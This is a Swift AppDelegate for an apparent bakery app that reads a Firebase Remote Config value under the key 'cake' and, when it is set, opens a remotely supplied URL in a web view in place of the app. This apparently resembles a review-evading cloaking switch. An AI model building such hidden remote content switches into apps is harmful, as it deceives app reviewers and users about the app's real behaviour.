
import SwiftUI
import FirebaseCore
import FirebaseAnalytics
import FirebaseInstallations
import FirebaseRemoteConfigInternal
import CoreData

@main
class AppDelegate: UIResponder, UIApplicationDelegate, UNUserNotificationCenterDelegate {
    var window: UIWindow?
    weak var initialVC: ViewController?
    static var orientationLock = UIInterfaceOrientationMask.all
    private var remoteConfig: RemoteConfig?
    
    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        FirebaseApp.configure()
        
        remoteConfig = RemoteConfig.remoteConfig()
        setupRemoteConfig()
        
        let viewController = ViewController()
        initialVC = viewController

        window?.rootViewController = initialVC
        window?.makeKeyAndVisible()

        start(viewController: viewController)
        return true
    }

    func setupRemoteConfig() {
        let settings = RemoteConfigSettings()
        settings.minimumFetchInterval = 0
        
        remoteConfig?.configSettings = settings
        

    }
    
    func application(_ application: UIApplication, supportedInterfaceOrientationsFor window: UIWindow?) -> UIInterfaceOrientationMask {
        return AppDelegate.orientationLock
    }
    
    func start(viewController: ViewController) {
        remoteConfig?.fetch { [weak self] status, error in
            guard let self = self else { return }
            if let error = error {
                viewController.openApp()
            }
            
            if status == .success {
                self.remoteConfig?.activate { _, error in
                    DispatchQueue.main.async {
                        if let error = error {
                            viewController.openApp()
                            return
                        }
                        
                        if let stringFire = self.remoteConfig?.configValue(forKey: "cake").stringValue {
                            
                            if !stringFire.isEmpty {
                                if let finalURL = UserDefaults.standard.string(forKey: "finalURL") {
                                    viewController.openWeb(stringURL: finalURL)
                                    return
                                }
                                
                                DispatchQueue.main.async {
                                    let stringURL = viewController.createURL(mainURL: stringFire)
                                    
                                    guard let url = URL(string: stringURL) else {
                                        viewController.openApp()
                                        return
                                    }
                                    
                                    if UIApplication.shared.canOpenURL(url) {
                                        viewController.openWeb(stringURL: stringURL)
                                    } else {
                                        viewController.openApp()
                                    }
                                }
                            } else {
                                viewController.openApp()
                            }
                        } else {
                            viewController.openApp()
                        }
                    }
                }
            } else {
                DispatchQueue.main.async {
                    viewController.openApp()
                }
            }
        }
    }

    lazy var persistentContainer: NSPersistentContainer = {
        let container = NSPersistentContainer(name: "PersonalBakery")
        container.loadPersistentStores(completionHandler: { (storeDescription, error) in
            if let error = error as NSError? {
                fatalError("Unresolved error \(error), \(error.userInfo)")
            }
        })
        return container
    }()

    func saveContext () {
        let context = persistentContainer.viewContext
        if context.hasChanges {
            do {
                try context.save()
            } catch {
                let nserror = error as NSError
                fatalError("Unresolved error \(nserror), \(nserror.userInfo)")
            }
        }
    }
}

